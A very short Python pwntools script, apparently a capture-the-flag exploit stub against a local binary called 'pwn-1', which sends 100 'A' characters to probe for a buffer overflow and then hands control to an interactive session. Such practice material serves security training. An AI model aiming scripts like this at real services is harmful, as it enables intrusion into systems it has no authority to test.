#!/usr/bin/env python3
from pwn import *

if args.LOCAL:
  p = process("./pwn-1")
else:
  p = remote("localhost", 8999)

p.recvline()
p.sendline("A" * 100)
p.interactive()
